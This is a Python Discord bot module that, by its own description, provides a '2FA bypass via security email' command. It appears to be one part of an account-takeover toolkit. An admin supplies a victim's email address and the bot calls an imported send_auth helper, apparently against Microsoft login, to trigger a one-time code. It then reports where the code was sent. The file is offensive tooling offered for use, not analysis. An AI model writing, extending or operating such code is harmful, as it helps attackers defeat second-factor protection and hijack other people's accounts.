"""OTP request cog (2FA bypass via security email)."""

import json
import logging

import discord
import httpx
from discord.ext import commands

from securing.auth.send_auth import send_auth

log = logging.getLogger("bot")


def _alias() -> str:
    with open("config/bot.json") as f:
        return json.load(f)["enabled_commands"]["aliases"]["request_otp"]


class RequestOTP(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @discord.slash_command(name=_alias(), description="Email OTP (2FA Bypass)")
    async def requestotp(
        self,
        ctx: discord.ApplicationContext,
        email: discord.Option(str, "Email address to send the OTP to"),
    ):
        if ctx.author.id not in self.bot.admins:
            await ctx.respond(
                "You do not have permission to execute this command!", ephemeral=True
            )
            return

        await ctx.defer(ephemeral=True)

        async with httpx.AsyncClient(timeout=None) as session:
            response = await send_auth(session, email)

        try:
            if "OtcLoginEligibleProofs" in response["response"]["Credentials"]:
                proof = response["response"]["Credentials"]["OtcLoginEligibleProofs"][0][
                    "display"
                ]
                await ctx.followup.send(
                    embed=discord.Embed(
                        description=f"Successfully sent OTP to `{proof}`",
                        color=0x3B89FF,
                    ),
                    ephemeral=True,
                )
                return
        except (KeyError, TypeError):
            pass

        await ctx.followup.send(
            embed=discord.Embed(
                description="Failed to send OTP, no eligible proofs found.",
                color=0xFF0000,
            ),
            ephemeral=True,
        )


def setup(bot: commands.Bot) -> None:
    bot.add_cog(RequestOTP(bot))
